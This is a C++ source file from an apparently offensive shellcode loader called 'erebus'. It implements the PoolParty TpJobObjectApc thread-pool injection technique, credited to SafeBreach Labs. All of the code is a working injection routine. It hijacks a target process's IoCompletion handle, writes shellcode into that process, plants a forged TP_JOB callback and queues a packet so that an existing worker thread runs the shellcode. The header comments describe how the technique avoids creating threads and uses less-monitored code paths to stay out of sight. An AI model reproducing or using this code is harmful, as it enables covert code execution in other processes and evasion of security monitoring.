/**
 * @file injection_poolparty_jobapc.cpp
 * @brief PoolParty – TpJobObjectApc / RemoteTpJobDirectInsertion
 *        (CONFIG_INJECTION_TYPE == 9)
 *
 * Credits:
 *   - SafeBreach Labs (https://safebreach.com/)
 *   - Alon Leviev (@_0xDeku)
 *   - "PoolParty - A New Set of Windows Thread Pool Injection Techniques"
 *   - Black Hat Europe 2023
 *
 * OPSEC profile
 * =============
 *   - No new thread created in the target process
 *   - Shellcode executes on an existing thread pool worker thread
 *   - Execution routed through TpJobNotifications dispatch path in ntdll –
 *     a less-monitored code path than the TP_DIRECT (type 4) path
 *   - Same IoCompletion handle hijack as type 4 (admin or SeDebugPrivilege)
 *   - Callback pointer sits inside RW TP_JOB struct – not on an executable page
 *
 * Technique (RemoteTpJobDirectInsertion / TpJobObjectApc)
 * =======================================================
 *   1. Hijack the target's IoCompletion handle (same as type 4)
 *   2. Write shellcode to target process (RX allocation)
 *   3. Build a TP_JOB struct with Callback at offset 0x50 = shellcode address
 *   4. Allocate TP_JOB in the target (RW)
 *   5. Write TP_JOB to target
 *   6. ZwSetIoCompletion(IoCompletion,
 *                        KeyContext  = &remote_tp_job,
 *                        ApcContext  = JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT (3),
 *                        IoStatus    = 0,
 *                        IoStatusInformation = 0)
 *   7. Thread pool dequeues the packet; the non-NULL ApcContext signals the
 *      TpJobNotifications handler which calls TP_JOB.Callback
 *
 * The ApcContext value is the discriminator:
 *   NULL          → TP_DIRECT path (type 4, RemoteTpDirectInsertion)
 *   JOB_MSG (!=0) → TP_JOB path   (type 9, TpJobObjectApc)
 *
 * No real job object needs to be created or associated with the target – the
 * thread pool acts only on the synthetic completion packet.
 */

#include "../../include/loader.hpp"
#include "../../include/injection/injection_poolparty_common.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 9

    /**
     * @brief PoolParty TpJobObjectApc injection.
     *
     * @param shellcode      Shellcode buffer
     * @param shellcode_size Size in bytes
     * @param hProcess       Target process handle (PROCESS_ALL_ACCESS)
     * @param hThread        Target thread handle; resumed first to let the
     *                       thread pool initialise (may be NULL for live targets)
     */
    VOID InjectionPoolPartyJobApc(IN BYTE* shellcode, IN SIZE_T shellcode_size,
                                  IN HANDLE hProcess, IN HANDLE hThread)
    {
        LOG_INFO("========================================");
        LOG_INFO("PoolParty (TpJobObjectApc)");
        LOG_INFO("Credits: SafeBreach Labs");
        LOG_INFO("========================================");

        HMODULE ntdll = ImportModule("ntdll.dll");
        if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

        ImportFunction(ntdll, NtResumeThread,          typeNtResumeThread);
        ImportFunction(ntdll, NtClose,                 typeNtClose);
        ImportFunction(ntdll, ZwSetIoCompletion,       typeZwSetIoCompletion);
        ImportFunction(ntdll, NtWriteVirtualMemory,    typeNtWriteVirtualMemory);
        ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);

        if (!NtResumeThread || !NtClose || !ZwSetIoCompletion ||
            !NtWriteVirtualMemory || !NtAllocateVirtualMemory) {
            LOG_ERROR("Failed to resolve NT functions");
            return;
        }

        NTSTATUS status;
        HANDLE   hIoCompletion    = NULL;
        PVOID    shellcodeAddress = NULL;
        PVOID    remoteTpJobAddr  = NULL;

        // Step 1: Resume thread so the thread pool can initialise.
        LOG_INFO("[1/5] Resuming target thread...");
        if (hThread && hThread != INVALID_HANDLE_VALUE && (ULONG_PTR)hThread > 1) {
            ULONG cnt = 0;
            status = NtResumeThread(hThread, &cnt);
            if (NT_SUCCESS(status))
                LOG_SUCCESS("Thread resumed (prev suspend count: %lu)", cnt);
            else
                LOG_INFO("Thread already running or resume failed");
        } else {
            LOG_INFO("Targeting existing process – thread already running");
        }

        // Step 2: Hijack IoCompletion handle.
        LOG_INFO("[2/5] Hijacking IoCompletion handle...");
        for (int attempt = 1; attempt <= 10; attempt++) {
            Sleep(500);
            hIoCompletion = HijackIoCompletionHandle(hProcess);
            if (hIoCompletion) break;
            if (attempt < 10)
                LOG_INFO("Thread pool not ready, retry %d/10...", attempt);
        }
        if (!hIoCompletion) {
            LOG_ERROR("Failed to hijack IoCompletion after 10 attempts");
            goto cleanup;
        }
        LOG_SUCCESS("Hijacked IoCompletion: 0x%p", hIoCompletion);

        // Step 3: Write shellcode (RX).
        LOG_INFO("[3/5] Writing shellcode to target...");
        shellcodeAddress = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
        if (!shellcodeAddress) {
            LOG_ERROR("WriteShellcodeInMemory failed");
            goto cleanup;
        }
        LOG_SUCCESS("Shellcode at: 0x%p", shellcodeAddress);

        // Step 4: Build and write TP_JOB structure.
        // Callback field is at offset 0x50; all other fields zeroed.
        LOG_INFO("[4/5] Writing TP_JOB to target...");
        {
            PP_TP_JOB tpJob   = { 0 };
            tpJob.Callback    = shellcodeAddress; // +0x50

            SIZE_T sz = sizeof(PP_TP_JOB);
            status = NtAllocateVirtualMemory(
                hProcess, &remoteTpJobAddr, 0, &sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!NT_SUCCESS(status)) {
                LOG_ERROR("NtAllocateVirtualMemory (TP_JOB) failed: 0x%08lX", status);
                goto cleanup;
            }

            SIZE_T written = 0;
            status = NtWriteVirtualMemory(
                hProcess, remoteTpJobAddr,
                &tpJob, sizeof(PP_TP_JOB), &written);
            if (!NT_SUCCESS(status)) {
                LOG_ERROR("NtWriteVirtualMemory (TP_JOB) failed: 0x%08lX", status);
                goto cleanup;
            }
            LOG_SUCCESS("TP_JOB at: 0x%p (Callback @ +0x50)", remoteTpJobAddr);
        }

        // Step 5: Queue packet – ApcContext = JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT
        // signals the thread pool to dispatch via TpJobNotifications, calling
        // TP_JOB.Callback instead of the TP_DIRECT handler.
        LOG_INFO("[5/5] Queuing IoCompletion packet (TpJobObjectApc)...");
        status = ZwSetIoCompletion(
            hIoCompletion,
            remoteTpJobAddr,                               // KeyContext  = &TP_JOB
            (PVOID)(ULONG_PTR)JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT, // ApcContext != NULL → TP_JOB path
            0, 0);
        if (!NT_SUCCESS(status)) {
            LOG_ERROR("ZwSetIoCompletion failed: 0x%08lX", status);
            goto cleanup;
        }

        LOG_SUCCESS("Packet queued – shellcode executes via TpJobNotifications handler");
        Sleep(1500 + (GetTickCount() % 1000));

    cleanup:
        if (hIoCompletion && hIoCompletion != INVALID_HANDLE_VALUE)
            NtClose(hIoCompletion);
        if (hThread  && hThread  != INVALID_HANDLE_VALUE) NtClose(hThread);
        if (hProcess && hProcess != INVALID_HANDLE_VALUE) NtClose(hProcess);
    }

#endif // CONFIG_INJECTION_TYPE == 9
} // namespace erebus
